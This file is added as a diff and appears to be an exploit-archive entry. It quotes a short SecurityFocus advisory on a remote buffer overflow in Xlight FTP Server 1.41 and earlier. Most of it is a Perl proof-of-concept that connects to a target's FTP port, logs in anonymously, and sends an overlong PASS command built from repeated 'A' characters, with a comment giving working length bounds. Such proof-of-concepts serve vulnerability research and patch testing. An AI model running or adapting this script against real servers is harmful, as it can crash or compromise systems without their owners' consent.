@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/9285/info
+
+It has been reported that Xlight FTP Server is prone to a remote buffer overflow condition that may allow an attacker to gain unauthorized access to a system running the vulnerable software. The issue presents itself when an attacker sends a specially crafted PASS command request containing an excessively long string value to the vulnerable server.
+
+Xlight FTP Server versions 1.41 and prior have been reported to be prone to this issue. 
+
+#!/usr/bin/perl
+ 
+# Exploit for Xlight FTP server long PASS vulnerability
+ 
+use IO::Socket;
+unless (@ARGV == 1) { die "usage: $0 host ..." }
+$host = shift(@ARGV);
+$remote = IO::Socket::INET->new( Proto => "tcp",
+                                 PeerAddr => $host,
+                                 PeerPort => "ftp(21)",
+                                 );
+unless ($remote) { die "cannot connect to ftp daemon on $host" }
+
+$remote->autoflush(1);
+
+print $remote "USER anonymous\r\n";
+sleep(1);
+
+$buf = "A"x54; # Min 54, Max 523
+print $remote "PASS ".$buf."\r\n";
+sleep(1);
+
+close $remote;
